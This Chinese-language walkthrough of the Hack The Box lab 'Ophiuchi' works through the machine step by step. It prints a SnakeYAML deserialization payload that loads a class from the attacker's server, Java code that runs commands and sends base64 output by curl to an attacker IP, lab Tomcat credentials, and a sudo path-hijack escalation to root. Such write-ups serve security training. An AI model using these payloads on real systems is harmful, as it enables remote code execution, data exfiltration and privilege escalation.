# Ophiuchi



目标ip：`10.10.10.227`

攻击机ip：`10.10.16.218`



## 信息收集



```shell
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 12:42 EDT
Nmap scan report for 10.10.10.227
Host is up (0.70s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 
8080/tcp open  http    Apache Tomcat 9.0.38
```



## web

8080 端口是tomcat，访问之后界面

![image-20210719161625168](https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210719161625168.png)猜测是 java 的 yaml 反序列化

查找资料，猜测是SnakeYaml 反序列化

参考资料：https://www.cnblogs.com/nice0e3/p/14514882.html

里面给出了poc

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://xxxx.com/"]]]]
```

首先进行测试

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://10.10.16.218:9090/yaml_poc_test"]]]]
```

并且在攻击机开启http服务

![image-20210719161930501](https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210719161930501.png)

发送poc后收到了http请求

![image-20210719162010714](https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210719162010714.png)

证明漏洞存在

修改[github的poc](https://github.com/artsploit/yaml-payload/)，写成一个命令回显的类

```java
public AwesomeScriptEngineFactory() throws Exception{
    try {
        Runtime.getRuntime().exec("curl http://10.10.16.218:9090/start");

        String result = "";

        String cmd = "ls";
        if (cmd != null && cmd.length() > 0) {
            Process p = Runtime.getRuntime().exec(cmd);
            java.io.OutputStream os = p.getOutputStream();
            java.io.InputStream in = p.getInputStream();
            java.io.DataInputStream dis = new java.io.DataInputStream(in);

            for (String disr = dis.readLine(); disr != null; disr = dis.readLine()) {
                result = result + disr + "\n";
            }
        }

        Runtime.getRuntime().exec("curl http://10.10.16.218:9090/" + Base64.getEncoder().encodeToString(result.getBytes()));

    } catch (IOException e) {
        Runtime.getRuntime().exec("curl http://10.10.16.218:9090/" + Base64.getEncoder().encodeToString(e.getMessage().getBytes()));
    } finally {
        Runtime.getRuntime().exec("curl http://10.10.16.218:9090/finally");
    }
}
```

<font color='red'>1.  为什么这里不直接反弹shell？ 因为网络波动太大，弹了好几次都会断。 2.  那为什么不用bind shell？ 因为靶机会重启。</font>

使用java8环境编译（高版本Java会报错），使用poc触发漏洞

![image-20210719162523463](https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210719162523463.png)

解码之后回显结果

```shell
# ls
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
```

查看进程

```shell
# ps -auxwww 
....
tomcat       833  0.4  4.4 3610268 178520 ?      Sl   07:43   0:11 /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.awt.headless=true -Djava.security.egd=file:/dev/./urandom -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Xms512M -Xmx1024M -server -XX:+UseParallelGC -Dignore.endorsed.dirs= -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -Dcatalina.home=/opt/tomcat -Djava.io.tmpdir=/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start
...
```

得到了tomcat所在的路径，翻找配置文件，在`/opt/tomcat/conf/tomcat-users.xml`中，找到了用户名和密码

```xml
<?xml version="1.0" encoding="UTF-8"?>
....
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
....
</tomcat-users>
```



## 提权

使用 admin 用户连接到目标靶机

`sudo -l` 发现可以免密使用

![image-20210719163250823](https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210719163250823.png)

在发现 /usr/bin/go 和 index.go 都没有权限修改之后，查看一下 index.go 的源码

```go
package main

import (
 "fmt"
 wasm "github.com/wasmerio/wasmer-go/wasmer"
 "os/exec"
 "log"
)


func main() {
 bytes, _ := wasm.ReadBytes("main.wasm")

 instance, _ := wasm.NewInstance(bytes)
 defer instance.Close()
 init := instance.Exports["info"]
 result,_ := init()
 f := result.String()
 if (f != "1") {
  fmt.Println("Not ready to deploy")
 } else {
  fmt.Println("Ready to deploy")
  out, err := exec.Command("/bin/sh", "deploy.sh").Output()
  if err != nil {
   log.Fatal(err)
  }
  fmt.Println(string(out))
 }
}

```

读源码可知，调用了外部的 main.wasm（花时间稍微研究了一下wasm）。如果wasm中的info函数返回了1，那就执行`deploy.sh`脚本

由于使用的是相对路径，会发生路径劫持攻击

1.  照[这个例子](https://developer.mozilla.org/zh-CN/docs/WebAssembly/C_to_wasm)，写一个c文件

    ```c
    #include <emscripten/emscripten.h>
    
    
    #ifdef __cplusplus
    extern "C" {
    #endif
    
    int EMSCRIPTEN_KEEPALIVE info() {
      return 1;
    }
    
    #ifdef __cplusplus
    }
    #endif
    ```

    

2.  编译 `emcc test.c -s WASM=1 --no-entry -o main.wasm`

    ![image-20210719163735073](https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210719163735073.png)

3.  上传文件

4.  执行`sudo -u root /usr/bin/go run /opt/wasm-functions/index.go`

其中 `deploy.sh` 内容为 `id`

得到root权限

![image-20210719163903384](https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210719163903384.png)

